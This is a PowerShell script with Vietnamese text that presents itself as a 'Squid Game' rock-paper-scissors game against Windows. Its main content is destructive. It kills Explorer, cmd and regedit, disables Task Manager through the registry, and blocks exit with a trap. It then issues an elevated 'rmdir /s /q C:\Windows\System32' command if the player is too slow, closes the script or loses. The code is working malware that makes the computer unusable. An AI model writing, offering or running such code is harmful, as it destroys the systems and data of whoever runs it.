Add-Type -TypeDefinition @"
using System;
using System.Windows.Forms;
public class MsgBox {
    public static void Show(string text, string caption) {
        MessageBox.Show(text, caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
    }
}
"@ -Language CSharp

# Hiển thị cảnh báo
[MsgBox]::Show("Chào mừng đến với Squid Game: Oẳn Tù Tì System32!`n`n- Chỉ có 15 giây để nhập lựa chọn.`n- Không nhập kịp = XÓA SYSTEM32.`n- Không thể thoát game!`n`nChúc may mắn!", "CẢNH BÁO!")

# Khóa các lối thoát
Write-Host "Khóa các lối thoát..."
Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "cmd" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "regedit" -Force -ErrorAction SilentlyContinue

# Chặn mở Task Manager
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -PropertyType DWORD -Force | Out-Null

# Chặn tắt script: Nếu bị tắt, System32 RIP
Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Disposed -Action {
    Write-Host "Bạn đã cố thoát! Xóa System32 ngay lập tức..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
} | Out-Null

$choices = @("búa", "kéo", "bao")
$playerScore = 0
$windowsScore = 0

Write-Host "Trò chơi bắt đầu! Chỉ có 15 giây để nhập lựa chọn."

for ($i=1; $i -le 5; $i++) {
    Write-Host "`nVán $i: Chọn búa, kéo hoặc bao (Bạn có 15 giây để nhập)"
    
    $playerChoice = $null
    $timeout = 15
    $startTime = Get-Date

    while ((New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds -lt $timeout) {
        if ($Host.UI.RawUI.KeyAvailable) {
            $playerChoice = Read-Host "Nhập lựa chọn của bạn"
            break
        }
        Start-Sleep -Milliseconds 500
    }

    if (-not $playerChoice) {
        Write-Host "Bạn đã chậm tay! Xóa System32 ngay lập tức..."
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
        exit
    }

    if ($choices -notcontains $playerChoice) {
        Write-Host "Lựa chọn không hợp lệ! Tính là thua."
        $windowsScore++
        continue
    }

    $windowsChoice = $choices | Get-Random
    Write-Host "Windows chọn: $windowsChoice"

    if ($playerChoice -eq $windowsChoice) {
        Write-Host "Hòa!"
    }
    elseif (
        ($playerChoice -eq "búa" -and $windowsChoice -eq "kéo") -or
        ($playerChoice -eq "kéo" -and $windowsChoice -eq "bao") -or
        ($playerChoice -eq "bao" -and $windowsChoice -eq "búa")
    ) {
        Write-Host "Bạn thắng!"
        $playerScore++
    }
    else {
        Write-Host "Windows thắng!"
        $windowsScore++
    }

    Write-Host "Tỷ số: Bạn [$playerScore] - Windows [$windowsScore]"
}

# Mở lại Explorer khi kết thúc
Start-Process explorer.exe

# Khôi phục quyền mở Task Manager
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -ErrorAction SilentlyContinue

if ($windowsScore -ge 3) {
    Write-Host "`nBạn đã thua. Như bạn đã đọc, System32 sẽ bị xóa."
    Write-Host "Nhưng tôi cũng không phải người xấu, nên tôi sẽ cho bạn thêm 2 phút sử dụng trước khi máy tính này hoàn toàn vô dụng. Chúc may mắn."
    
    # Đếm ngược 2 phút
    for ($i=120; $i -ge 1; $i--) {
        Write-Host "`rCòn lại: $i giây" -NoNewline
        Start-Sleep -Seconds 1
    }

    # Xóa System32 sau 2 phút
    Write-Host "`nHết thời gian. Xóa System32 ngay bây giờ..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
} else {
    Write-Host "`nChúc mừng! Bạn đã thắng, System32 vẫn an toàn."
}
